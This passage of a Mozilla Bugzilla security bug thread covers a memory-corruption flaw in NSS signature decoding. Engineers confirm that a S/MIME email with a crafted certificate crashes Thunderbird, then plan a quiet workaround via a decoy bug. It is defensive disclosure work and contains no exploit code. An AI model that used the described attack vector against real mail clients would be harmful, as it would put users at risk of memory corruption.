          <td class="change-author"><div class="vcard vcard_592223" id="a270777_75935"><a class="email " href="/user_profile?user_id=592223" > <span class="fna">taviso</span></a>
</div>
              <span class="user-role">Reporter</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner ghost iconic" id="cs-25"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-25" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1737470#c25">Comment 25</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2021-10-28 17:18 PDT" data-time="1635466704">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-25">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
      class="comment-text markdown-body "
      id="ct-25" data-comment-id="15633848"><p>(In reply to Ryan Sleevi from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed" href="/show_bug.cgi?id=1737470#c24" title="RESOLVED FIXED - Memory Corruption in decodeECorDsaSignature with DSA signatures (and RSA-PSS)">comment #24</a>)<br>
t could be that all <em>DSS</em> algorithms are off be default...</p>
<blockquote>
<p>Bob: The TLS layer doesn&#39;t use the <code>VFY_</code> abstraction layer (nor <code>vfy_VerifyData</code>), they directly use the PK11 functions (e.g. in <a href="https://searchfox.org/nss/source/lib/ssl/ssl3con.c" rel="nofollow">https://searchfox.org/nss/source/lib/ssl/ssl3con.c</a> )</p>
</blockquote>
<p>FWIW, I put a breakpoint on VFY_CreateContext with condition <code>$_any_caller_matches(&quot;mozilla::pkix&quot;, 50) == 0</code>. Apart from the matches already mentioned in <a class="bz_bug_link
          bz_status_RESOLVED bz_closed" href="/show_bug.cgi?id=1737470#c22" title="RESOLVED FIXED - Memory Corruption in decodeECorDsaSignature with DSA signatures (and RSA-PSS)">comment 22</a> (Manifests, Content Signatures, etc), there were various hits via <code>ssl_VerifySignedHashesWithPubKey</code>. I&#39;m not sure I really understand the context though, is that relevant?</p>
<blockquote>
<p>Tavis: Regarding good (fuzz) coverage, this family of functions aren&#39;t covered by fuzzed data themselves. That is, you&#39;re likely seeing positive fuzzer coverage because of <a href="https://searchfox.org/nss/source/fuzz/tls_server_certs.cc" rel="nofollow">https://searchfox.org/nss/source/fuzz/tls_server_certs.cc</a> , but that uses fixed certs, not fuzzed certs. That may explain why you see corpus inputs exercising the code, but failing to find.</p>
</blockquote>
<p>Hmm, I think you&#39;re right - that seems worth fixing, I&#39;ll look into it!</p>
</div></div><div class="change-set" id="c26"><div class="comment" data-id="15633871" data-no="26"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-26" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_381992" id="a270777_75935"><img src="https://secure.gravatar.com/avatar/a430cf58452b9e73dfdde1555ad7eab3?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_381992" id="a270777_75935"><a class="email " href="/user_profile?user_id=381992" > <span class="fna">Ryan Sleevi</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner ghost iconic" id="cs-26"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-26" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1737470#c26">Comment 26</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2021-10-28 18:11 PDT" data-time="1635469893">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-26">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
      class="comment-text markdown-body "
      id="ct-26" data-comment-id="15633871"><p>Ah, thanks Tavis. Not sure why my code query failed - although it looks like NSS explicitly calls the (not buggy, AIUI) PK11 methods for PSS and DSA.</p>
<blockquote>
<p>Hmm, I think you&#39;re right - that seems worth fixing, I&#39;ll look into it!</p>
</blockquote>
<p>Yeah, right now only a cluster of decode functions are fuzzed with arbitrary inputs, along with the TLS state machine. No signature verification fuzzing happens.</p>
<p>It probably is worth reviving <a class="bz_bug_link
          bz_status_NEW" href="/show_bug.cgi?id=1253107" title="NEW - Legacy ASN.1 decoder should offer an option as to whether or not to zero internal memory">Bug 1253107</a> as part of that. One element that is new from when I was last fuzzing these was the fuzzer pre processor macro of <code>FUZZING_BUILD_MODE_UNSAFE_FOR_PRODUCTION</code>, which makes it a bit easier to skip the zeroization without having to worry about the FIPS implications. That should hopefully make these extra functions a bit more reasonable.</p>
</div></div><div class="change-set" id="c27"><div class="comment" data-id="15633912" data-no="27"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-27" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_36541" id="a270777_75935"><img src="https://secure.gravatar.com/avatar/d11b5b0a468ed960df1fde3c304d3580?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_36541" id="a270777_75935"><a class="email " href="/user_profile?user_id=36541" > <span class="fna">Kai Engert [:KaiE:]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner ghost iconic" id="cs-27"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-27" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1737470#c27">Comment 27</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2021-10-28 20:10 PDT" data-time="1635477023">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-27">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
      class="comment-text markdown-body "
      id="ct-27" data-comment-id="15633912"><p>(In reply to Daniel Veditz [:dveditz] from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed" href="/show_bug.cgi?id=1737470#c18" title="RESOLVED FIXED - Memory Corruption in decodeECorDsaSignature with DSA signatures (and RSA-PSS)">comment #18</a>)</p>
<blockquote>
<p>Adding Kai because this might have pose a more exposed risk for Thunderbird users if S/MIME supports these signature types. Can you check that out, Kai?</p>
</blockquote>
<p>Thunderbird seems affected, sending an email with a S/MIME signature that contains a malicious certificate is sufficient.</p>
<p>When performing an S/MIME signature verification...<br>
<a href="https://searchfox.org/comm-esr91/rev/cc5a292314d25cc582225fd22a20f7bd3b0f6072/mailnews/extensions/smime/nsCMS.cpp#158" rel="nofollow">https://searchfox.org/comm-esr91/rev/cc5a292314d25cc582225fd22a20f7bd3b0f6072/mailnews/extensions/smime/nsCMS.cpp#158</a></p>
<p>...  one the first thing done is importing all the certificate that are seen in the incoming signature:<br>
<a href="https://searchfox.org/comm-esr91/rev/cc5a292314d25cc582225fd22a20f7bd3b0f6072/mailnews/extensions/smime/nsCMS.cpp#241" rel="nofollow">https://searchfox.org/comm-esr91/rev/cc5a292314d25cc582225fd22a20f7bd3b0f6072/mailnews/extensions/smime/nsCMS.cpp#241</a></p>
<p>That code wants to import valid certificates, only, and NSS_CMSSignedData_ImportCerts calls CERT_VerifyCert:<br>
<a href="https://searchfox.org/nss/rev/8c23e8e507c132e74fd5b98e472b76200b9a6984/lib/smime/cmssigdata.c#591" rel="nofollow">https://searchfox.org/nss/rev/8c23e8e507c132e74fd5b98e472b76200b9a6984/lib/smime/cmssigdata.c#591</a></p>
<p>I don&#39;t see any filtering for signature algorithms prior to doing the above, apparently any incoming certificate will be fed to CERT_VerifyCert.</p>
<p>Note that there&#39;s code later that wants to obtain the validity of the signature. While that code also eventually calls CERT_VerifyCert (through NSS_CMSSignedData_VerifySignerInfo and NSS_CMSSignerInfo_VerifyCertificate), that code isn&#39;t executed unless a check with the mozilla::pkix verifier reports the signing certificate as currently valid. If mozilla::pkix causes certificates reported in this bug as invalid, then we won&#39;t reach the CERT_VerifyCert code path.</p>
<p>We probably cannot skip the initial call to NSS_CMSSignedData_ImportCerts, the certs are imported to ensure they will be available during verification, for building the chain of the signing certificate.</p>
<p>If mozilla::pkix verification detects/rejects the bad certificates, we could modify the initial importing to use the same strategy, call mozilla::pkix first. Avoding to require a new API in a chemspill, we&#39;d have to copy the implementation of NSS_CMSSignedData_ImportCerts into Thunderbird, and tweak it accordingly.</p>
</div><div class="activity"><div class="change">Flags: <span class="activity-deleted">needinfo?(kaie)</span></div></div></div><div class="change-set" id="c28"><div class="comment" data-id="15633915" data-no="28"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-28" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_36541" id="a270777_75935"><img src="https://secure.gravatar.com/avatar/d11b5b0a468ed960df1fde3c304d3580?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_36541" id="a270777_75935"><a class="email " href="/user_profile?user_id=36541" > <span class="fna">Kai Engert [:KaiE:]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner ghost iconic" id="cs-28"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-28" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1737470#c28">Comment 28</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2021-10-28 20:18 PDT" data-time="1635477522">3 years ago</span>
          </div>&bull;
<div class="change-revisions">
  <a href="/page.cgi?id=comment-revisions.html&amp;bug_id=1737470&amp;comment_id=15633915"
     title="1 revision">Edited</a>
</div>
        </td>
      </tr>

      <tr id="ctag-28">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
      class="comment-text markdown-body "
      id="ct-28" data-comment-id="15633915"><p>Please help me clarify my assumption from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed" href="/show_bug.cgi?id=1737470#c27" title="RESOLVED FIXED - Memory Corruption in decodeECorDsaSignature with DSA signatures (and RSA-PSS)">comment 27</a>:</p>
<p>Does <a class="bz_bug_link
          bz_status_RESOLVED bz_closed" href="/show_bug.cgi?id=1737470#c9" title="RESOLVED FIXED - Memory Corruption in decodeECorDsaSignature with DSA signatures (and RSA-PSS)">comment 9</a> mean that mozpkix is not vulnerable, and will detect and reject such crafted certificates, when calling GetDefaultCertVerifier()-&gt;VerifyCert() ?</p>
</div></div><div class="change-set" id="c29"><div class="comment" data-id="15633945" data-no="29"
       data-tags="">
    
    <table class="layout-table change-head reporter" id="ch-29" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_592223" id="a270777_75935"><img src="https://secure.gravatar.com/avatar/27c1a60000797d8e229249290a7c7377?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_592223" id="a270777_75935"><a class="email " href="/user_profile?user_id=592223" > <span class="fna">taviso</span></a>
</div>
              <span class="user-role">Reporter</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner ghost iconic" id="cs-29"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-29" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1737470#c29">Comment 29</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2021-10-28 22:54 PDT" data-time="1635486880">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-29">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div id="att-9248366"
         class="attachment"
         data-id="9248366" itemscope itemtype="http://schema.org/MediaObject">
      <meta itemprop="name" content="test.eml">
      <meta itemprop="contentSize" content="10832">
      <meta itemprop="encodingFormat" content="message/rfc822">
      <div class="label">
        Attached file
          <a class="link" href="attachment.cgi?id=9248366" itemprop="contentUrl" >
        <span id="att-9248366-description" itemprop="description">smime-test.eml</span></a>
        â€” <a href="attachment.cgi?id=9248366&amp;action=edit" itemprop="url" data-details="1">Details</a>
      </div>
    </div>

  <div
      class="comment-text markdown-body "
      id="ct-29" data-comment-id="15633945"><p>(In reply to Kai Engert (:KaiE:) from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed" href="/show_bug.cgi?id=1737470#c28" title="RESOLVED FIXED - Memory Corruption in decodeECorDsaSignature with DSA signatures (and RSA-PSS)">comment #28</a>)</p>
<blockquote>
<p>Please help me clarify my assumption from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed" href="/show_bug.cgi?id=1737470#c27" title="RESOLVED FIXED - Memory Corruption in decodeECorDsaSignature with DSA signatures (and RSA-PSS)">comment 27</a>:</p>
<p>Does <a class="bz_bug_link
          bz_status_RESOLVED bz_closed" href="/show_bug.cgi?id=1737470#c9" title="RESOLVED FIXED - Memory Corruption in decodeECorDsaSignature with DSA signatures (and RSA-PSS)">comment 9</a> mean that mozpkix is not vulnerable, and will detect and reject such crafted certificates, when calling GetDefaultCertVerifier()-&gt;VerifyCert() ?</p>
</blockquote>
<p>Kai: I made you a test email, I just inserted my demo cert into an example s/mime pkcs7 blob I found on github, can you try it? (I&#39;m not really familiar with Thunderbird sorry)</p>
<p>I found the original email <a href="https://github.com/fastmail/authentication_milter_smime/blob/master/t/data/example/smime.eml" rel="nofollow">here</a>, if the syntax is bad, maybe you can try fixing it up (I just manually patched it).</p>
</div><div class="activity"><div class="change">Flags: needinfo?(kaie)</div></div></div><div class="change-set" id="c30"><div class="comment" data-id="15633967" data-no="30"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-30" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_36541" id="a270777_75935"><img src="https://secure.gravatar.com/avatar/d11b5b0a468ed960df1fde3c304d3580?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_36541" id="a270777_75935"><a class="email " href="/user_profile?user_id=36541" > <span class="fna">Kai Engert [:KaiE:]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner ghost iconic" id="cs-30"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-30" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1737470#c30">Comment 30</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2021-10-28 23:40 PDT" data-time="1635489626">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-30">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
      class="comment-text markdown-body "
      id="ct-30" data-comment-id="15633967"><p>Thanks Tavis! I will test very soon, and I&#39;m making this top priority, will spend today on this issue.</p>
<p>Thunderbird technical manager mkmelin asked to be CC&#39;ed to this bug, but we probably want to keep the CC list at a minimum right now. I guess at this time, accidentally spreading information about this bug is the highest risk.</p>
</div></div><div class="change-set" id="c31"><div class="comment" data-id="15633990" data-no="31"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-31" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_622637" id="a270777_75935"><img src="https://secure.gravatar.com/avatar/38f561698d679a724938d4600c0f8b52?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_622637" id="a270777_75935"><a class="email " href="/user_profile?user_id=622637" > <span class="fna">Benjamin Beurdouche [:beurdouche]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner ghost iconic" id="cs-31"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-31" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1737470#c31">Comment 31</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2021-10-29 00:33 PDT" data-time="1635492799">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-31">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
      class="comment-text markdown-body "
      id="ct-31" data-comment-id="15633990"><p>I agree, I might CC at least one person from Apple so that they can double check that they are not affected though.</p>
</div></div><div class="change-set" id="c32"><div class="comment" data-id="15634413" data-no="32"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-32" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_36541" id="a270777_75935"><img src="https://secure.gravatar.com/avatar/d11b5b0a468ed960df1fde3c304d3580?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_36541" id="a270777_75935"><a class="email " href="/user_profile?user_id=36541" > <span class="fna">Kai Engert [:KaiE:]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner ghost iconic" id="cs-32"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-32" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1737470#c32">Comment 32</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2021-10-29 06:41 PDT" data-time="1635514898">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-32">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
      class="comment-text markdown-body "
      id="ct-32" data-comment-id="15634413"><p>I think I have good news for the Thunderbird situation, but step by step:</p>
<p>The attached S/MIME test email crashes Thunderbird in CERT_VerifyCert, so it&#39;s confirmed TB is vulnerable.</p>
<p>Then I modified TB to test the theory from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed" href="/show_bug.cgi?id=1737470#c27" title="RESOLVED FIXED - Memory Corruption in decodeECorDsaSignature with DSA signatures (and RSA-PSS)">comment 27</a>.<br>
For each cert that NSS wants to import, the test code starts by calling mozpkix::VerifyCert. If that fails, we skip import (and thereby skip CERT_VerifyCert).</p>
<p>This doesn&#39;t crash. We don&#39;t crash in the import step. And we don&#39;t crash in the signature verify step (which already calls mozpkix::VerifyCert prior to calling CERT_VerifyCert).</p>
<p>The patch I have has to copy a few functions from NSS to Thunderbird code. But it should be safe to copy those implementation details, we can assume they won&#39;t change on the stable TB 91 branch, and for comm-central, we can plan to undo that shortly afterwards. The reason is that we cannot easily add new NSS APIs on the stable branch, and copying the functions avoids new APIs on the stable branch.</p>
<p>We could add this patch to Thunderbird using a decoy bug.<br>
We could file a new bug, which says we want to perform some additional verification prior to importing certs, for consistency with the existing signature validation code.</p>
<p>I think the decoy bug could be public, and we&#39;d explain as little as possible. I&#39;d talk to a Thunderbird reviewer in private to get them to confirm the Thunderbird code change.<br>
The actual review could happen here (or, if you prefer to keep this bug small, file a separate security sensitive bug for the TB patch review discussion.)</p>
<p>I&#39;m attaching the patch in here, so you can have a first look.</p>
</div><div class="activity"><div class="change">Flags: <span class="activity-deleted">needinfo?(kaie)</span></div></div></div><div class="change-set" id="c33"><div class="comment" data-id="15634414" data-no="33"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-33" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_36541" id="a270777_75935"><img src="https://secure.gravatar.com/avatar/d11b5b0a468ed960df1fde3c304d3580?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_36541" id="a270777_75935"><a class="email " href="/user_profile?user_id=36541" > <span class="fna">Kai Engert [:KaiE:]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner ghost iconic" id="cs-33"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-33" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1737470#c33">Comment 33</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2021-10-29 06:42 PDT" data-time="1635514952">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-33">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
      class="comment-text markdown-body "
      id="ct-33" data-comment-id="15634414"><p>My only remaining question at this point is:</p>
<p>Is mozpkix known to avoid the crash, or are we just lucky that it doesn&#39;t crash with this example message?</p>
</div></div><div class="change-set" id="c34"><div class="comment" data-id="15634415" data-no="34"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-34" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_36541" id="a270777_75935"><img src="https://secure.gravatar.com/avatar/d11b5b0a468ed960df1fde3c304d3580?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_36541" id="a270777_75935"><a class="email " href="/user_profile?user_id=36541" > <span class="fna">Kai Engert [:KaiE:]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner ghost iconic" id="cs-34"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-34" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1737470#c34">Comment 34</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2021-10-29 06:43 PDT" data-time="1635514994">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-34">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div id="att-9248424"
         class="attachment patch obsolete"
         data-id="9248424" itemscope itemtype="http://schema.org/MediaObject">
      <meta itemprop="name" content="1737470-tb.patch">
      <meta itemprop="contentSize" content="9855">
      <meta itemprop="encodingFormat" content="text/plain">
      <div class="label">
        Attached patch
          <meta itemprop="contentUrl" content="attachment.cgi?id=9248424">
          <a class="link" href="attachment.cgi?id=9248424&amp;action=diff">
        <span id="att-9248424-description" itemprop="description">Thunderbird decoy workaround, v1 (moved to bug 1738501)</span></a> (obsolete)
        â€” <a href="attachment.cgi?id=9248424&amp;action=edit" itemprop="url" data-details="1">Details</a>
          â€” <a href="/page.cgi?id=splinter.html&ignore=&bug=1737470&attachment=9248424">Splinter Review</a>
      </div>
    </div>

  <div
      class="comment-text markdown-body empty"
      id="ct-34" data-comment-id="15634415"></div></div><div class="change-set" id="c35"><div class="comment" data-id="15634439" data-no="35"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-35" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_381992" id="a270777_75935"><img src="https://secure.gravatar.com/avatar/a430cf58452b9e73dfdde1555ad7eab3?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_381992" id="a270777_75935"><a class="email " href="/user_profile?user_id=381992" > <span class="fna">Ryan Sleevi</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner ghost iconic" id="cs-35"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-35" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1737470#c35">Comment 35</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2021-10-29 07:05 PDT" data-time="1635516313">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-35">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
      class="comment-text markdown-body "
      id="ct-35" data-comment-id="15634439"><p>re: <a class="bz_bug_link
          bz_status_RESOLVED bz_closed" href="/show_bug.cgi?id=1737470#c33" title="RESOLVED FIXED - Memory Corruption in decodeECorDsaSignature with DSA signatures (and RSA-PSS)">Comment #33</a><br>
<code>mozpkix</code> appears to avoid this issue because:</p>
<ul>
<li>It does not accept DSA certificates</li>
<li>It does not accept RSA-PSS certificates</li>
</ul>
<p>The relevant code for verifying signatures is <a href="https://searchfox.org/mozilla-central/rev/daa5c195e5efe45a63bf79f97ae77419b16f62f1/security/nss/lib/mozpkix/lib/pkixnss.cpp#84-100" rel="nofollow">https://searchfox.org/mozilla-central/rev/daa5c195e5efe45a63bf79f97ae77419b16f62f1/security/nss/lib/mozpkix/lib/pkixnss.cpp#84-100</a> - those are the only two entry points into the <a href="https://searchfox.org/mozilla-central/rev/daa5c195e5efe45a63bf79f97ae77419b16f62f1/security/nss/lib/mozpkix/lib/pkixnss.cpp#42-47,72-74" rel="nofollow">affected function</a></p>
<p>That&#39;s because these are the only two algorithms <code>mozpkix</code> allows through its <a href="https://searchfox.org/mozilla-central/rev/daa5c195e5efe45a63bf79f97ae77419b16f62f1/security/nss/lib/mozpkix/include/pkix/pkixtypes.h#303-311,321-329" rel="nofollow">embedder interface</a></p>
</div></div><div class="change-set" id="c36"><div class="comment" data-id="15634441" data-no="36"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-36" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_381992" id="a270777_75935"><img src="https://secure.gravatar.com/avatar/a430cf58452b9e73dfdde1555ad7eab3?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_381992" id="a270777_75935"><a class="email " href="/user_profile?user_id=381992" > <span class="fna">Ryan Sleevi</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner ghost iconic" id="cs-36"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-36" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1737470#c36">Comment 36</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2021-10-29 07:06 PDT" data-time="1635516413">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-36">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
      class="comment-text markdown-body "
      id="ct-36" data-comment-id="15634441"><p>So I think if you&#39;re looking at taking that route for TB (routing through <code>mozpkix</code>), the question will be: are you comfortable changing the supported signature algorithms to those of <code>mozpkix</code>, or will that be a regression for your TB use cases?</p>
</div></div><div class="change-set" id="c37"><div class="comment" data-id="15634545" data-no="37"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-37" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_36541" id="a270777_75935"><img src="https://secure.gravatar.com/avatar/d11b5b0a468ed960df1fde3c304d3580?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_36541" id="a270777_75935"><a class="email " href="/user_profile?user_id=36541" > <span class="fna">Kai Engert [:KaiE:]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner ghost iconic" id="cs-37"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-37" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1737470#c37">Comment 37</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2021-10-29 09:06 PDT" data-time="1635523578">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-37">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
      class="comment-text markdown-body "
      id="ct-37" data-comment-id="15634545"><p>Ryan, thanks a lot for the explanation. I wasn&#39;t aware. I didn&#39;t intend to disable algorithms. I need to research if we must support those for S/MIME.</p>
</div></div><div class="change-set" id="c38"><div class="comment" data-id="15634600" data-no="38"
       data-tags="">
    
    <table class="layout-table change-head reporter" id="ch-38" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_592223" id="a270777_75935"><img src="https://secure.gravatar.com/avatar/27c1a60000797d8e229249290a7c7377?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_592223" id="a270777_75935"><a class="email " href="/user_profile?user_id=592223" > <span class="fna">taviso</span></a>
</div>
              <span class="user-role">Reporter</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner ghost iconic" id="cs-38"
